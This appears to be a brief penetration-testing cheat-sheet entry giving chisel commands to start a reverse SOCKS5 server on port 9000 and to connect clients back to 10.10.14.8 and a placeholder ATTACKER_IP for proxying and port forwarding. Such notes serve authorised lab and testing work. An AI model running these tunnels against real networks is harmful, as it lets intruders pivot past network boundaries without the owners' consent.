

## Socks

### server

```bash

chisel server --reverse -p 9000 -socks5

chisel server --reverse -p 9000

```

### Client

```cmd
chisel.exe client 10.10.14.8:9000 R:socks

./chisel client ATTACKER_IP:9000 R:8888:127.0.0.1:8888



```